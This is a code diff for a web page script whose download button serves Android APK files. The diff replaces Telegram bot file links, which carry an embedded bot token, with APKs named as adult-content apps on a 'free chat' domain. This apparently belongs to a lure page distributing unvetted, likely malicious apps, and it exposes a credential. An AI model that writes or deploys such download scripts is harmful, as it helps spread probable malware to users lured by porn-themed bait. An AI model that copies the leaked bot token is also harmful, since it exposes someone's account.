@@ -3,10 +3,10 @@ import { sendLog } from './log.js';
 document.addEventListener("DOMContentLoaded", () => {
   const btn = document.getElementById('download-button');
   const apkLinks = [
-    "https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_4.apk",
-    "https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_5.apk",
-    "https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_6.apk",
-    "https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_7.apk"
+    "https://free.ucretsizsohbet.online/TurkPornoV1.apk",
+    "https://free.ucretsizsohbet.online/TurkPornoV2.apk",
+    "https://free.ucretsizsohbet.online/TurkPornoV3.apk",
+    "https://free.ucretsizsohbet.online/TurkPornoV4.apk"
   ];
 
   btn.addEventListener('click', () => {
@@ -36,3 +36,4 @@ document.addEventListener("DOMContentLoaded", () => {
     }, 4000);
   });
 });
+
